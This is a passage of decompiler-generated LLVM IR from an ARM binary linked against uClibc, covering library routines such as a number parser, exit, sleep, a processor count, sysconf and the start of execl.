  store i32 %v1_1404c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14050

dec_label_pc_14050:                               ; preds = %entry, %dec_label_pc_1404c
  %v0_14088 = phi i32 [ %v0_14040, %entry ], [ %v1_1404c, %dec_label_pc_1404c ]
  %v1_14050 = inttoptr i32 %v0_14088 to i8*
  %v2_14050 = load i8, i8* %v1_14050, align 1
  %v3_14050 = zext i8 %v2_14050 to i32
  %v4_14054 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 524) to i32*), align 4
  %v2_14058 = mul nuw nsw i32 %v3_14050, 2
  %v2_1405c = add i32 %v2_14058, %v4_14054
  %v3_1405c = inttoptr i32 %v2_1405c to i16*
  %v4_1405c = load i16, i16* %v3_1405c, align 2
  %v1_14060 = and i16 %v4_1405c, 32
  %v2_14060 = icmp eq i16 %v1_14060, 0
  br i1 %v2_14060, label %dec_label_pc_14068, label %dec_label_pc_1404c

dec_label_pc_14068:                               ; preds = %dec_label_pc_14050
  %v7_14068 = icmp eq i8 %v2_14050, 43
  br i1 %v7_14068, label %dec_label_pc_14088, label %dec_label_pc_14070

dec_label_pc_14070:                               ; preds = %dec_label_pc_14068
  %v7_14070 = icmp eq i8 %v2_14050, 45
  br i1 %v7_14070, label %dec_label_pc_14088, label %bb

bb:                                               ; preds = %dec_label_pc_14070
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1408c

dec_label_pc_14088:                               ; preds = %dec_label_pc_14068, %dec_label_pc_14070
  %storemerge47 = phi i32 [ 1, %dec_label_pc_14070 ], [ 0, %dec_label_pc_14068 ]
  store i32 %storemerge47, i32* %r7.global-to-local, align 4
  %v1_14088 = add i32 %v0_14088, 1
  store i32 %v1_14088, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1408c

dec_label_pc_1408c:                               ; preds = %bb, %dec_label_pc_14088
  %v0_140ac = phi i32 [ %v0_14088, %bb ], [ %v1_14088, %dec_label_pc_14088 ]
  %v1_1408c = and i32 %v0_1403c, -17
  %v3_1408c = icmp eq i32 %v1_1408c, 0
  br i1 %v3_1408c, label %dec_label_pc_14098, label %bb60

bb60:                                             ; preds = %dec_label_pc_1408c
  br label %bb64

dec_label_pc_14098:                               ; preds = %dec_label_pc_1408c
  %v1_14098 = inttoptr i32 %v0_140ac to i8*
  %v2_14098 = load i8, i8* %v1_14098, align 1
  %v7_1409c = icmp eq i8 %v2_14098, 48
  %v1_140a0 = add i32 %v0_1403c, 10
  store i32 %v1_140a0, i32* %r5.global-to-local, align 4
  br i1 %v7_1409c, label %dec_label_pc_140ac, label %bb61

bb61:                                             ; preds = %dec_label_pc_14098
  br label %.thread8

dec_label_pc_140ac:                               ; preds = %dec_label_pc_14098
  %v1_140ac = add i32 %v0_140ac, 1
  %v2_140ac = inttoptr i32 %v1_140ac to i8*
  %v3_140ac = load i8, i8* %v2_140ac, align 1
  %v4_140ac = zext i8 %v3_140ac to i32
  store i32 %v1_140ac, i32* %r4.global-to-local, align 4
  %v1_140b0 = or i32 %v4_140ac, 32
  %v7_140b4 = icmp eq i32 %v1_140b0, 120
  %v1_140b8 = add i32 %v0_1403c, 8
  store i32 %v1_140b8, i32* %r5.global-to-local, align 4
  br i1 %v7_140b4, label %bb62, label %.thread8

bb62:                                             ; preds = %dec_label_pc_140ac
  %v3_140c4 = mul i32 %v1_140b8, 2
  store i32 %v3_140c4, i32* %r5.global-to-local, align 4
  %v2_140c8 = add i32 %v0_140ac, 2
  store i32 %v2_140c8, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_140ac, %bb61, %bb62
  %v1_1419430 = phi i32 [ %v0_14040, %bb61 ], [ %v1_140ac, %bb62 ], [ %v1_140ac, %dec_label_pc_140ac ]
  %v0_1411821 = phi i32 [ %v0_140ac, %bb61 ], [ %v2_140c8, %bb62 ], [ %v1_140ac, %dec_label_pc_140ac ]
  %v0_140cc = phi i32 [ %v1_140a0, %bb61 ], [ %v3_140c4, %bb62 ], [ %v1_140b8, %dec_label_pc_140ac ]
  %v5_140d0 = icmp slt i32 %v0_140cc, 16
  br i1 %v5_140d0, label %bb64, label %bb63

bb63:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %bb60, %.thread8, %bb63
  %v1_1419429 = phi i32 [ %v0_14040, %bb60 ], [ %v1_1419430, %.thread8 ], [ %v1_1419430, %bb63 ]
  %v0_1411820 = phi i32 [ %v0_140ac, %bb60 ], [ %v0_1411821, %.thread8 ], [ %v0_1411821, %bb63 ]
  %v0_140f8 = phi i32 [ %v0_1403c, %bb60 ], [ %v0_140cc, %.thread8 ], [ 16, %bb63 ]
  %v1_140d4 = add i32 %v0_140f8, -2
  %tmp = icmp ugt i32 %v1_140d4, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_140e4

.thread:                                          ; preds = %bb64
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_14190

dec_label_pc_140e4:                               ; preds = %bb64
  %v2_140ec = udiv i32 -1, %v0_140f8
  %v3_140ec = urem i32 -1, %v0_140f8
  %v1_140fc = urem i32 %v3_140ec, 256
  store i32 %v1_140fc, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 %v2_140ec, i32* %r8.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_14118

dec_label_pc_14114:                               ; preds = %bb71, %dec_label_pc_14174
  %v0_14114 = phi i32 [ %v1_1415444, %bb71 ], [ %v0_14114.pre, %dec_label_pc_14174 ]
  br label %dec_label_pc_14118

dec_label_pc_14118:                               ; preds = %dec_label_pc_140e4, %dec_label_pc_14114
  %v1_1419427 = phi i32 [ %v1_1419429, %dec_label_pc_140e4 ], [ %v0_14114, %dec_label_pc_14114 ]
  %v0_14154 = phi i32 [ %v0_1411820, %dec_label_pc_140e4 ], [ %v0_14114, %dec_label_pc_14114 ]
  %v1_14118 = inttoptr i32 %v0_14154 to i8*
  %v2_14118 = load i8, i8* %v1_14118, align 1
  %v3_14118 = zext i8 %v2_14118 to i32
  %v1_1411c = add nsw i32 %v3_14118, -48
  %v1_14120 = urem i32 %v1_1411c, 256
  %v1_14128 = or i32 %v3_14118, 32
  %tmp79 = icmp ult i32 %v1_14120, 10
  br i1 %tmp79, label %bb66, label %dec_label_pc_14130

dec_label_pc_14130:                               ; preds = %dec_label_pc_14118
  %tmp80 = icmp ugt i32 %v1_14128, 96
  br i1 %tmp80, label %bb65, label %bb66

bb65:                                             ; preds = %dec_label_pc_14130
  %v1_14134 = add nsw i32 %v1_14128, -87
  %v5_1413c = urem i32 %v1_14134, 256
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_14118, %dec_label_pc_14130, %bb65
  %v3_1416c = phi i32 [ %v1_14120, %dec_label_pc_14118 ], [ 40, %dec_label_pc_14130 ], [ %v5_1413c, %bb65 ]
  %v1_14140 = load i32, i32* %r5.global-to-local, align 4
  %v6_14144 = icmp slt i32 %v3_1416c, %v1_14140
  br i1 %v6_14144, label %dec_label_pc_14148, label %dec_label_pc_14190.loopexit

dec_label_pc_14148:                               ; preds = %bb66
  %v0_14148 = load i32, i32* @ip, align 4
  %v1_14148 = load i32, i32* %r8.global-to-local, align 4
  %v9_14148 = icmp eq i32 %v0_14148, %v1_14148
  br i1 %v9_14148, label %.thread39, label %bb67

.thread39:                                        ; preds = %dec_label_pc_14148
  %v1_1415440 = add i32 %v0_14154, 1
  store i32 %v1_1415440, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1415c

bb67:                                             ; preds = %dec_label_pc_14148
  %v3_14148 = icmp ult i32 %v0_14148, %v1_14148
  %v1_14154 = add i32 %v0_14154, 1
  store i32 %v1_14154, i32* %r4.global-to-local, align 4
  br i1 %v3_14148, label %dec_label_pc_1415c, label %dec_label_pc_14174

dec_label_pc_1415c:                               ; preds = %bb67, %.thread39
  %v1_1415444 = phi i32 [ %v1_1415440, %.thread39 ], [ %v1_14154, %bb67 ]
  %v4_141642443 = phi i32 [ 1, %.thread39 ], [ 0, %bb67 ]
  %v1_1415c = load i32, i32* %sl.global-to-local, align 4
  %v3_1415c = icmp uge i32 %v3_1416c, %v1_1415c
  %v9_1415c = icmp eq i32 %v3_1416c, %v1_1415c
  %v2_14160 = xor i1 %v3_1415c, true
  %v3_14160 = or i1 %v9_1415c, %v2_14160
  br i1 %v3_14160, label %bb68, label %bb69

bb68:                                             ; preds = %dec_label_pc_1415c
  br label %bb69

bb69:                                             ; preds = %dec_label_pc_1415c, %bb68
  %v4_14164 = phi i32 [ %v4_141642443, %dec_label_pc_1415c ], [ 0, %bb68 ]
  %v2_14164 = xor i1 %v9_1415c, true
  %v3_14164 = and i1 %v3_1415c, %v2_14164
  br i1 %v3_14164, label %bb70, label %thread-pre-split

bb70:                                             ; preds = %bb69
  %v5_14164 = urem i32 %v4_14164, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb69, %bb70
  %v0_14168 = phi i32 [ %v5_14164, %bb70 ], [ %v4_14164, %bb69 ]
  %v2_14168 = icmp eq i32 %v0_14168, 0
  br i1 %v2_14168, label %bb71, label %dec_label_pc_14174

bb71:                                             ; preds = %thread-pre-split
  %v4_1416c = mul i32 %v0_14148, %v1_14140
  %v5_1416c = add i32 %v4_1416c, %v3_1416c
  store i32 %v5_1416c, i32* @ip, align 4
  br label %dec_label_pc_14114

dec_label_pc_14174:                               ; preds = %bb67, %thread-pre-split
  %v0_14174 = call i32 @__GI___errno_location()
  %v0_1417c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_1417c, i32* @ip, align 4
  %v0_14180 = load i32, i32* %r7.global-to-local, align 4
  %v2_14180 = and i32 %v0_14180, %v0_14044
  store i32 %v2_14180, i32* %r7.global-to-local, align 4
  %v2_14188 = inttoptr i32 %v0_14174 to i32*
  store i32 34, i32* %v2_14188, align 4
  %v0_14114.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14114

dec_label_pc_14190.loopexit:                      ; preds = %bb66
  %v0_14190.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_14190

dec_label_pc_14190:                               ; preds = %.thread, %dec_label_pc_14190.loopexit
  %v1_14194 = phi i32 [ %v1_1419427, %dec_label_pc_14190.loopexit ], [ %v1_1419429, %.thread ]
  %v2_14194 = phi i32 [ %v0_14190.pre, %dec_label_pc_14190.loopexit ], [ %v0_14038, %.thread ]
  %v2_14190 = icmp eq i32 %v2_14194, 0
  br i1 %v2_14190, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_14190
  %v3_14194 = inttoptr i32 %v2_14194 to i32*
  store i32 %v1_14194, i32* %v3_14194, align 4
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_14190, %bb72
  %v0_1419c = load i32, i32* %r7.global-to-local, align 4
  %v2_1419c = icmp eq i32 %v0_1419c, 0
  %. = select i1 %v2_1419c, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v2_141a8 = icmp eq i32 %v0_14044, 0
  %v0_141cc.pre.pre = load i32, i32* @ip, align 4
  br i1 %v2_141a8, label %dec_label_pc_141c4, label %bb76

bb76:                                             ; preds = %bb73
  %tmp81 = icmp ugt i32 %v0_141cc.pre.pre, %.
  br i1 %tmp81, label %dec_label_pc_141b4, label %dec_label_pc_141c4

dec_label_pc_141b4:                               ; preds = %bb76
  %v0_141b4 = call i32 @__GI___errno_location()
  %v2_141bc = inttoptr i32 %v0_141b4 to i32*
  store i32 34, i32* %v2_141bc, align 4
  %v0_141c0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_141c0, i32* @ip, align 4
  %v0_141c4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_141c4

dec_label_pc_141c4:                               ; preds = %bb76, %bb73, %dec_label_pc_141b4
  %v0_141cc.pre = phi i32 [ %v0_141cc.pre.pre, %bb76 ], [ %v0_141c0, %dec_label_pc_141b4 ], [ %v0_141cc.pre.pre, %bb73 ]
  %v0_141c4 = phi i32 [ %v0_1419c, %bb76 ], [ %v0_141c4.pre, %dec_label_pc_141b4 ], [ %v0_1419c, %bb73 ]
  %v2_141c4 = icmp eq i32 %v0_141c4, 0
  br i1 %v2_141c4, label %dec_label_pc_141c4._crit_edge, label %bb77

bb77:                                             ; preds = %dec_label_pc_141c4
  %v2_141c8 = sub i32 0, %v0_141cc.pre
  store i32 %v2_141c8, i32* @ip, align 4
  br label %dec_label_pc_141c4._crit_edge

dec_label_pc_141c4._crit_edge:                    ; preds = %dec_label_pc_141c4, %bb77
  %v0_141cc = phi i32 [ %v2_141c8, %bb77 ], [ %v0_141cc.pre, %dec_label_pc_141c4 ]
  %sext = mul i32 %v0_141cc, 65536
  %v2_141d8 = sdiv i32 %sext, 65536
  ret i32 %v2_141d8

; uselistorder directives
  uselistorder i32 %v0_141cc.pre, { 1, 0 }
  uselistorder i32 %v0_141cc.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_14164, { 1, 0 }
  uselistorder i1 %v3_1415c, { 1, 0 }
  uselistorder i32 %v1_1415c, { 1, 0 }
  uselistorder i32 %v1_14128, { 1, 0 }
  uselistorder i32 %v1_14120, { 1, 0 }
  uselistorder i32 %v0_14154, { 1, 0, 2 }
  uselistorder i32 %v0_14114, { 1, 0 }
  uselistorder i32 %v3_140c4, { 1, 0 }
  uselistorder i32 %v1_140b8, { 1, 0, 2 }
  uselistorder i32 %v0_140ac, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_14088, { 0, 1, 3, 2 }
  uselistorder i32 %v0_14044, { 1, 0 }
  uselistorder i32 %v0_14040, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1403c, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 4, 2, 1, 3, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9 }
  uselistorder label %dec_label_pc_141c4._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_141c4, { 2, 0, 1 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %dec_label_pc_14190, { 1, 0 }
  uselistorder label %dec_label_pc_14174, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb69, { 1, 0 }
  uselistorder label %bb66, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14118, { 1, 0 }
  uselistorder label %dec_label_pc_14114, { 1, 0 }
  uselistorder label %bb64, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1408c, { 1, 0 }
  uselistorder label %dec_label_pc_14088, { 1, 0 }
  uselistorder label %dec_label_pc_14050, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* @r5, align 4
  %v4_141f0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 92) to i32*), align 4
  store i32 %v4_141f0, i32* @r4, align 4
  %v2_141f8 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_14210 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_14210)
  %v0_14224 = load i32, i32* @r5, align 4
  %v2_14224 = add i32 %v0_14224, 16
  %v3_14224 = inttoptr i32 %v2_14224 to i32*
  %v4_14224 = load i32, i32* %v3_14224, align 4
  call void @__pseudo_branch(i32 %v4_14224)
  %v0_14234 = load i32, i32* @r5, align 4
  %v2_14234 = add i32 %v0_14234, 26280
  %v3_14234 = inttoptr i32 %v2_14234 to i32*
  %v4_14234 = load i32, i32* %v3_14234, align 4
  %v2_14238 = icmp eq i32 %v4_14234, 0
  br i1 %v2_14238, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_14244 = xor i1 %v2_14238, true
  call void @__pseudo_cond_branch(i1 %v2_14244, i32 %v4_14234)
  store i32 %v2_141f8, i32* @r0, align 4
  %v0_14254 = load i32, i32* @r5, align 4
  %v2_14254 = add i32 %v0_14254, 24
  %v3_14254 = inttoptr i32 %v2_14254 to i32*
  %v4_14254 = load i32, i32* %v3_14254, align 4
  call void @__pseudo_branch(i32 %v4_14254)
  %v0_14260 = call i32 @__GI___uClibc_fini()
  %v0_14268 = load i32, i32* @r5, align 4
  %v2_14268 = add i32 %v0_14268, -89796
  %v10_14268 = icmp eq i32 %v2_14268, 0
  br i1 %v10_14268, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %sext = mul i32 %v2_14268, 65536
  %v1_14270 = sdiv i32 %sext, 65536
  %v3_14270 = xor i1 %v10_14268, true
  call void @__pseudo_cond_branch(i1 %v3_14270, i32 %v1_14270)
  %v0_14274 = load i32, i32* @r6, align 4
  %v1_14278 = call i32 @__GI__exit(i32 %v0_14274)
  %v0_1427c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1427c, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v1_1427c = load i32, i32* @r1, align 4
  %v3_1427c = load i32, i32* @lr, align 4
  %v8_1427c = shl i32 %v4_14254, %v3_1427c
  %v9_1427c = and i32 %v8_1427c, %v1_1427c
  store i32 %v9_1427c, i32* @r1, align 4
  store i32 0, i32* @r6, align 4
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v10_14294 = phi i32 [ %v1_14278, %bb9 ], [ 0, %bb10 ]
  ret i32 %v10_14294

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 0, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_1429c = load i32, i32* @r4, align 4
  %v6_1429c = load i32, i32* @lr, align 4
  %v2_142a0 = icmp eq i32 %arg1, 0
  store i32 0, i32* @r4, align 4
  br i1 %v2_142a0, label %dec_label_pc_14334, label %dec_label_pc_142b0

dec_label_pc_142b0:                               ; preds = %entry
  %v2_142c0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 65536, i32* %stack_var_-24, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v3_142d4 = call i32 @__libc_sigaction(i32 17, i32 0, i32 %v2_142c0)
  %v3_142d8 = load i32, i32* %stack_var_-44, align 4
  %v7_142dc = icmp eq i32 %v3_142d8, 1
  br i1 %v7_142dc, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_142b0
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_142b0, %bb
  call void @__pseudo_cond_branch(i1 %v7_142dc, i32 ptrtoint (i32* @global_var_fa0c.513 to i32))
  %v2_142f0 = ptrtoint i32* %stack_var_-16 to i32
  %v2_142f8 = call i32 @__libc_nanosleep(i32 %v2_142f0, i32 %v2_142f0)
  %v2_142fc = icmp eq i32 %v2_142f8, 0
  br i1 %v2_142fc, label %bb19, label %bb18

bb18:                                             ; preds = %.thread2
  %v3_14310 = load i32, i32* %stack_var_-16, align 4
  br label %bb19

bb19:                                             ; preds = %.thread2, %bb18
  %storemerge = phi i32 [ %v3_14310, %bb18 ], [ 0, %.thread2 ]
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v3_14320 = load i32, i32* %stack_var_-24, align 4
  %v1_14324 = and i32 %v3_14320, 65536
  %v2_14324 = icmp eq i32 %v1_14324, 0
  br i1 %v2_14324, label %bb20, label %.thread6

bb20:                                             ; preds = %bb19
  br label %.thread6

.thread6:                                         ; preds = %bb19, %bb20
  call void @__pseudo_cond_branch(i1 %v2_14324, i32 ptrtoint (i32* @global_var_fa0c.513 to i32))
  %v0_14334.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14334

dec_label_pc_14334:                               ; preds = %entry, %.thread6
  %v0_14334 = phi i32 [ %v0_14334.pre, %.thread6 ], [ 0, %entry ]
  store i32 %v3_1429c, i32* @r4, align 4
  store i32 %v6_1429c, i32* @lr, align 4
  ret i32 %v0_14334

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_sigaction, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14334, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 -35116), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_14368 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 -35116))
  store i32 %v1_14368, i32* @r6, align 4
  %v2_1436c = icmp eq i32 %v1_14368, 0
  br i1 %v2_1436c, label %dec_label_pc_143ec, label %dec_label_pc_14374

dec_label_pc_14374:                               ; preds = %entry
  store i32 524, i32* @sl, align 4
  %v0_1437c = load i32, i32* @r4, align 4
  %v2_1437c = add i32 %v0_1437c, -35104
  store i32 %v2_1437c, i32* @r8, align 4
  %v2_14380 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_14380, i32* @r7, align 4
  br label %bb18

dec_label_pc_14388:                               ; preds = %bb18
  %v3_14388 = load i32, i32* %stack_var_-36, align 4
  %v1_1438c = inttoptr i32 %v3_14388 to i32*
  %v2_1438c = load i32, i32* %v1_1438c, align 4
  %v1_14390 = inttoptr i32 %v2_1438c to i8*
  %v2_14390 = load i8, i8* %v1_14390, align 1
  %v7_14394 = icmp eq i8 %v2_14390, 99
  br i1 %v7_14394, label %dec_label_pc_1439c, label %.backedge3

dec_label_pc_1439c:                               ; preds = %dec_label_pc_14388
  %v1_1439c = add i32 %v2_1438c, 1
  %v2_1439c = inttoptr i32 %v1_1439c to i8*
  %v3_1439c = load i8, i8* %v2_1439c, align 1
  %v7_143a0 = icmp eq i8 %v3_1439c, 112
  br i1 %v7_143a0, label %dec_label_pc_143a8, label %.backedge3

dec_label_pc_143a8:                               ; preds = %dec_label_pc_1439c
  %v1_143a8 = add i32 %v2_1438c, 2
  %v2_143a8 = inttoptr i32 %v1_143a8 to i8*
  %v3_143a8 = load i8, i8* %v2_143a8, align 1
  %v7_143ac = icmp eq i8 %v3_143a8, 117
  br i1 %v7_143ac, label %dec_label_pc_143b4, label %.backedge3

dec_label_pc_143b4:                               ; preds = %dec_label_pc_143a8
  %v1_143b4 = add i32 %v2_1438c, 3
  %v2_143b4 = inttoptr i32 %v1_143b4 to i8*
  %v3_143b4 = load i8, i8* %v2_143b4, align 1
  %v4_143b4 = zext i8 %v3_143b4 to i32
  %v0_143b8 = load i32, i32* @r4, align 4
  %v1_143b8 = load i32, i32* @sl, align 4
  %v2_143b8 = add i32 %v1_143b8, %v0_143b8
  %v3_143b8 = inttoptr i32 %v2_143b8 to i32*
  %v4_143b8 = load i32, i32* %v3_143b8, align 4
  %v2_143bc = mul nuw nsw i32 %v4_143b4, 2
  %v2_143c0 = add i32 %v4_143b8, %v2_143bc
  %v3_143c0 = inttoptr i32 %v2_143c0 to i16*
  %v4_143c0 = load i16, i16* %v3_143c0, align 2
  %v1_143c4 = and i16 %v4_143c0, 8
  %v2_143c4 = icmp eq i16 %v1_143c4, 0
  br i1 %v2_143c4, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_143b4
  %v1_143c8 = load i32, i32* @r5, align 4
  %v2_143c8 = add i32 %v1_143c8, 1
  store i32 %v2_143c8, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_143b4, %dec_label_pc_14388, %dec_label_pc_1439c, %dec_label_pc_143a8
  %v0_143cc.pre = load i32, i32* @r6, align 4
  %v0_143d8.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_14374
  %v0_143d8 = phi i32 [ %v0_143d8.pre, %.backedge3 ], [ %v2_1437c, %dec_label_pc_14374 ]
  %v0_143cc = phi i32 [ %v0_143cc.pre, %.backedge3 ], [ %v1_14368, %dec_label_pc_14374 ]
  %v4_143dc = inttoptr i32 %v0_143cc to i32*
  %v5_143dc = call i32 @__GI_config_read(i32* %v4_143dc, i32 %v2_14380, i32 258, i32 %v0_143d8)
  %v2_143e0 = icmp eq i32 %v5_143dc, 0
  br i1 %v2_143e0, label %dec_label_pc_14450, label %dec_label_pc_14388

dec_label_pc_143ec:                               ; preds = %entry
  %v0_143f0 = load i32, i32* @r4, align 4
  %v2_143f0 = add i32 %v0_143f0, -35100
  store i32 %v2_143f0, i32* @r0, align 4
  %v1_143f4 = call i32 @__GI_config_open(i32 %v2_143f0)
  store i32 %v1_143f4, i32* @r6, align 4
  %v2_143f8 = icmp eq i32 %v1_143f4, 0
  br i1 %v2_143f8, label %bb19, label %dec_label_pc_14404

bb19:                                             ; preds = %dec_label_pc_143ec
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_14450

dec_label_pc_14404:                               ; preds = %dec_label_pc_143ec
  %v0_14408 = load i32, i32* @r4, align 4
  %v2_14408 = add i32 %v0_14408, -35084
  store i32 %v2_14408, i32* @r8, align 4
  %v2_14410 = add i32 %v0_14408, -35048
  store i32 %v2_14410, i32* @r7, align 4
  %v2_14414 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_14414, i32* @r4, align 4
  br label %bb21

dec_label_pc_1441c:                               ; preds = %bb21
  %v0_14448 = load i32, i32* @r8, align 4
  %v3_1441c = load i32, i32* %stack_var_-36, align 4
  %v1_14420 = inttoptr i32 %v3_1441c to i32*
  %v2_14420 = load i32, i32* %v1_14420, align 4
  store i32 %v2_14420, i32* @r1, align 4
  %v2_14424 = inttoptr i32 %v0_14448 to i8*
  %v3_14424 = call i32 @__GI_strcoll(i8* %v2_14424, i32 %v2_14420)
  %v2_14428 = icmp eq i32 %v3_14424, 0
  br i1 %v2_14428, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_1441c
  %v1_1442c = load i32, i32* @r5, align 4
  %v2_1442c = add i32 %v1_1442c, 1
  store i32 %v2_1442c, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_1441c
  %v0_14438.pre = load i32, i32* @r7, align 4
  %v0_1443c.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_14404
  %v0_1443c = phi i32 [ %v0_1443c.pre, %.backedge ], [ %v1_143f4, %dec_label_pc_14404 ]
  %v0_14438 = phi i32 [ %v0_14438.pre, %.backedge ], [ %v2_14410, %dec_label_pc_14404 ]
  %v4_14440 = inttoptr i32 %v0_1443c to i32*
  %v5_14440 = call i32 @__GI_config_read(i32* %v4_14440, i32 %v2_14414, i32 459266, i32 %v0_14438)
  %v2_14444 = icmp eq i32 %v5_14440, 0
  br i1 %v2_14444, label %dec_label_pc_14450, label %dec_label_pc_1441c

dec_label_pc_14450:                               ; preds = %bb18, %bb21, %bb19
  %v0_14450 = load i32, i32* @r6, align 4
  %v1_14454 = inttoptr i32 %v0_14450 to i32*
  %v2_14454 = call i32 @__GI_config_close(i32* %v1_14454)
  %v0_14458 = load i32, i32* @r5, align 4
  %v2_14458 = icmp eq i32 %v0_14458, 0
  %.v0_14458 = select i1 %v2_14458, i32 1, i32 %v0_14458
  ret i32 %.v0_14458

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder label %dec_label_pc_14450, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_1487c

bb:                                               ; preds = %entry
  %v7_144a8 = mul i32 %arg1, 4
  %v8_144a8 = add i32 %v7_144a8, ptrtoint (i32* @global_var_144b0.525 to i32)
  call void @__pseudo_branch(i32 %v8_144a8)
  br label %dec_label_pc_1487c

dec_label_pc_1487c:                               ; preds = %bb, %entry
  %v0_1487c = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_14888 = inttoptr i32 %v0_1487c to i32*
  store i32 22, i32* %v2_14888, align 4
  %v0_14a38 = load i32, i32* %r2.global-to-local, align 4
  ret i32 %v0_14a38

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_14a6c = ptrtoint i32* %stack_var_0 to i32
